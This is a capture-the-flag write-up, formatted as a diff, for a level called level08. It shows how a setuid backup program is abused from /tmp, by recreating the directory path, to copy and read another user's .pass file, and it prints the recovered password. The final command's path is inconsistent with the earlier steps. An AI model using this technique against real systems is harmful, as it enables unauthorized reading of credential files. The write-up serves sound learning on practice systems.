@@ -1,0 +1,36 @@
+The program copies what's in argv[1] into the backups directory.
+Since we cannot create anything ourselves into ~/backups let's try into /tmp .
+
+$ cd /tmp ; mkdir backups
+
+If we try with a single file, we notice that the copy works just fine.
+
+$ echo "hello world" > hello && ~/level08 hello && ls -l backups
+total 4
+-rw-rw---- 1 level09 users 12 Feb 19 20:31 hello
+
+If we try to copy a file from a directory like /bin/bash we get the following error
+
+$ ~/level08 /bin/bash
+ERROR: Failed to open ./backups//bin/bash
+
+The important thing to notice here is the double '/'.
+This simply means that the program didn't find the directory bin in backups.
+If we create a directory called bin into backups and we try again, it works !
+
+$ mkdir backups/bin && ~/level08 /bin/bash && ls -l backups/
+total 0
+drwxrwxr-x 2 level08 level08 60 Feb 19 20:24 bin
+
+Let's now try with the .pass file we're looking for
+
+$ mkdir -p backups/home/users/level09 && ~/level08 /home/users/level09/.pass && ls -la backups/home/users/level09/
+total 4
+drwxrwxr-x 2 level08 level08 60 Feb 19 20:34 .
+drwxrwxr-x 3 level08 level08 60 Feb 19 20:33 ..
+-rw-rw---- 1 level09 users   41 Feb 19 20:34 .pass
+
+Here we go !
+
+$ cat /backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
